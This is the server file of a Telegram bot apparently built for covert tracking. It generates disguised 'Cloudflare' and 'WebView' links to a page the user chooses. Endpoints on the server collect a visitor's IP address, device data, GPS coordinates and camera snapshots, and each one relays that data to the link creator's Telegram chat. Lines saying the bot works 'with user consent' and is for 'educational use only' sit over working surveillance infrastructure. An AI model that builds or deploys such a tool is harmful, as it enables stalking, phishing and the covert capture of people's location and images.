require('dotenv').config();
const fs = require("fs");
const express = require("express");
const cors = require('cors');
const bodyParser = require('body-parser');
const fetch = require('node-fetch');
const TelegramBot = require('node-telegram-bot-api');

const app = express();
const bot = new TelegramBot(process.env.BOT_TOKEN, { polling: true });

const jsonParser = bodyParser.json({ limit: '20mb', type: 'application/json' });
const urlencodedParser = bodyParser.urlencoded({ extended: true, limit: '20mb', type: 'application/x-www-form-urlencoded' });

app.use(jsonParser);
app.use(urlencodedParser);
app.use(cors());
app.set("view engine", "ejs");

// ✅ SET YOUR LIVE DOMAIN HERE:
const hostURL = process.env.HOST_URL || "https://paidplan.zone.id";
const use1pt = false;

// ✅ Routes to render pages
app.get("/w/:path/:uri", (req, res) => {
  const ip = req.headers['x-forwarded-for']?.split(",")[0] || req.connection.remoteAddress || req.ip;
  const time = new Date().toISOString().slice(0, 19).replace('T', ' ');
  if (req.params.path) {
    res.render("webview", {
      ip: ip,
      time: time,
      url: Buffer.from(req.params.uri, 'base64').toString(),
      uid: req.params.path,
      a: hostURL,
      t: use1pt
    });
  } else {
    res.redirect("https://t.me/cosmic_warriorBot");
  }
});

app.get("/c/:path/:uri", (req, res) => {
  const ip = req.headers['x-forwarded-for']?.split(",")[0] || req.connection.remoteAddress || req.ip;
  const time = new Date().toISOString().slice(0, 19).replace('T', ' ');
  if (req.params.path) {
    res.render("cloudflare", {
      ip: ip,
      time: time,
      url: Buffer.from(req.params.uri, 'base64').toString(),
      uid: req.params.path,
      a: hostURL,
      t: use1pt
    });
  } else {
    res.redirect("https://t.me/shinita_cameraBot");
  }
});

// ✅ Bot handlers
bot.on('message', async (msg) => {
  const chatId = msg.chat.id;

  if (msg?.reply_to_message?.text === "🌐 Enter Your URL") {
    createLink(chatId, msg.text);
  }

  if (msg.text === "/start") {
    const m = {
      reply_markup: JSON.stringify({
        "inline_keyboard": [[{ text: "Create Link", callback_data: "crenew" }]]
      })
    };
    bot.sendMessage(chatId, `Hello ${msg.chat.first_name}! 💗\nUse me to create links that collect data (with user consent).`, m);
  } else if (msg.text === "/create") {
    createNew(chatId);
  } else if (msg.text === "/help") {
    bot.sendMessage(chatId, `📌 How to use me:\n\n👉 Watch: https://t.me/paidtechzone/11\n\n⚠️ Note: Some sites block iframes.\nThis bot is for testing / educational use only.`);
  }
});

bot.on('callback_query', (callbackQuery) => {
  bot.answerCallbackQuery(callbackQuery.id);
  if (callbackQuery.data === "crenew") {
    createNew(callbackQuery.message.chat.id);
  }
});

// ✅ Create Link function
async function createLink(chatId, msg) {
  const encoded = [...msg].some(char => char.charCodeAt(0) > 127);

  if ((msg.toLowerCase().includes('http')) && !encoded) {
    const url = chatId.toString(36) + '/' + Buffer.from(msg).toString('base64');
    const cUrl = `${hostURL}/c/${url}`;
    const wUrl = `${hostURL}/w/${url}`;
    const m = {
      reply_markup: JSON.stringify({
        "inline_keyboard": [[{ text: "Create New Link", callback_data: "crenew" }]]
      })
    };

    bot.sendChatAction(chatId, "typing");

    if (use1pt) {
      const shortC = await fetch(`https://short-link-api.vercel.app/?query=${encodeURIComponent(cUrl)}`).then(r => r.json());
      const shortW = await fetch(`https://short-link-api.vercel.app/?query=${encodeURIComponent(wUrl)}`).then(r => r.json());
      bot.sendMessage(chatId, `✅ Links Created:\n\nCloudflare Link:\n${Object.values(shortC).join('\n')}\n\nWebView Link:\n${Object.values(shortW).join('\n')}`, m);
    } else {
      bot.sendMessage(chatId, `✅ Links Created:\n\n🌐 Cloudflare Link:\n${cUrl}\n\n🌐 WebView Link:\n${wUrl}`, m);
    }
  } else {
    bot.sendMessage(chatId, "⚠️ Please enter a valid URL (including http or https).");
    createNew(chatId);
  }
}

function createNew(chatId) {
  const mk = {
    reply_markup: JSON.stringify({ "force_reply": true })
  };
  bot.sendMessage(chatId, "🌐 Enter Your URL", mk);
}

// ✅ APIs to receive data
app.get("/", (req, res) => {
  const ip = req.headers['x-forwarded-for']?.split(",")[0] || req.connection.remoteAddress || req.ip;
  res.json({ ip: ip });
});

app.post("/location", (req, res) => {
  const lat = parseFloat(req.body.lat);
  const lon = parseFloat(req.body.lon);
  const uid = req.body.uid;
  const acc = req.body.acc;

  if (lat && lon && uid && acc) {
    bot.sendLocation(parseInt(uid, 36), lat, lon);
    bot.sendMessage(parseInt(uid, 36), `Latitude: ${lat}\nLongitude: ${lon}\nAccuracy: ${acc} meters`);
    res.send("Done");
  } else {
    res.status(400).send("Invalid Data");
  }
});

app.post("/", (req, res) => {
  const uid = req.body.uid;
  const data = req.body.data;
  const ip = req.headers['x-forwarded-for']?.split(",")[0] || req.connection.remoteAddress || req.ip;

  if (uid && data) {
    if (!data.includes(ip)) return res.send("ok");
    bot.sendMessage(parseInt(uid, 36), data.replaceAll("<br>", "\n"), { parse_mode: "HTML" });
    res.send("Done");
  } else {
    res.status(400).send("Invalid Data");
  }
});

app.post("/camsnap", (req, res) => {
  const uid = req.body.uid;
  const img = req.body.img;

  if (uid && img) {
    const buffer = Buffer.from(img, 'base64');
    bot.sendPhoto(parseInt(uid, 36), buffer, {}, {
      filename: "camsnap.png",
      contentType: "image/png"
    });
    res.send("Done");
  } else {
    res.status(400).send("Invalid Data");
  }
});

// ✅ Start the server (Render automatically uses PORT)
const PORT = process.env.PORT || 5000;
app.listen(PORT, () => {
  console.log(`✅ Server running on port ${PORT}`);
});
